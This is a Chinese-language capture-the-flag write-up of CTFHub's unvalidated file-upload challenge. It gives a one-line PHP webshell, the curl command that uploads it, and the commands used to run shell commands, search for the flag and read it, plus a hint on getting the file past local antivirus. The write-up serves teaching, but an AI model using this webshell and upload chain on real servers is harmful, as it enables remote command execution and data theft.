---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 无验证"
date: 2026-10-28

skill: "web-upload/无验证"
completed: true
---

# CTFHub Writeup - 无验证

## 题目类型

Web

## 题目描述

CTFHub 文件上传 - 无限制
Filename: 未选择文件


## 解题过程

<br>1. 访问首页并查看响应，页面中只有一个文件上传表单：表单字段名为 file，提交按钮名为 submit；响应头包含 Server: openresty/1.21.4.2 和 X-Powered-By: PHP/7.3.14。
<br>2. 准备 PHP 一句话木马 shell.php，内容为 \<?php echo shell\_exec($\_GET\["c"\]); ?\>。记录中说明在 Windows 上若本地杀软拦截 .php 文件，可通过 PowerShell 管道不落地发送；随后使用 curl -F "file=@shell.php;type=application/octet-stream" -F "submit=Submit" 向目标上传。
<br>3. 上传返回 \<script\>alert('上传成功')\</script\>上传文件相对路径\<br\>upload/shell.php，因此得到木马地址 http://challenge-f1419e6739e57520.sandbox.ctfhub.com:10800/upload/shell.php。
<br>4. 请求 shell.php?c=id，返回 uid=33(www-data) gid=33(www-data) groups=33(www-data)，确认命令执行成功；再执行 pwd;ls -la，返回当前目录 /var/www/html/upload 及 shell.php。记录中还请求 phpinfo 检查 disable\_functions，记录结论为本环境为空。
<br>5. 使用 find / -maxdepth 4 -iname "\*flag\*" -not -path "/proc/\*" 2\>/dev/null 搜索文件名，命中 /var/www/html/flag\_2710831109.php。
<br>6. 执行 cat /var/www/html/flag\_2710831109.php，返回 \<?php // ctfhub\{3726726e36fc2546e9e1a59c\}，取得 flag：ctfhub\{3726726e36fc2546e9e1a59c\}。

## 疑问与解答

### 1.

<br>问题：为什么上传 .php 文件后能直接执行命令？
<br>解答：因为题目是无验证上传，服务器未限制文件后缀、类型和内容，且 upload 目录可被 Web 访问并交由 PHP 解析；上传的 PHP 脚本在被请求时执行 shell\_exec，从而把命令输出返回给访问者。

### 2.

<br>问题：disable\_functions 在这个利用链里起什么作用？
<br>解答：PHP 的 disable\_functions 可以禁用 shell\_exec、system 等命令执行函数；如果该配置为空，WebShell 中的 shell\_exec 就不会被禁用。记录中通过 phpinfo 检查并判断本环境为空。

### 3.

<br>问题：为什么用 find 搜索 flag 文件名？
<br>解答：flag 文件的位置和名称不一定固定，直接猜测路径容易失败；find 按文件名模式搜索可以定位目标，限定搜索深度并排除 /proc 能减少无关结果。


## 本题的核心逻辑：


<br>文件上传漏洞的关键不只是“文件能上传”，而是上传后的文件能否被服务器按脚本解析。本题无验证，允许直接上传 .php，上传目录又可通过 URL 访问，因此形成从文件上传到远程命令执行的利用链。

<br>获得命令执行后，flag 读取通常需要先定位文件。本题通过 find 搜索 \*flag\* 命中 PHP 文件，再用 cat 读取注释中的 flag，说明 WebShell 可进一步完成文件系统探测和敏感文件读取。


## 笔记

这道题主要学习了：

<br>1. 文件上传无验证时，可以直接上传 PHP 脚本进行测试；利用成立的关键是上传目录可访问、脚本能被 PHP 解析，并且命令执行函数没有被禁用。
<br>2. 获得 WebShell 后，通常先确认当前用户、工作目录和 PHP 配置，再搜索 flag 文件并读取；这种顺序有助于判断权限范围和目标文件位置。
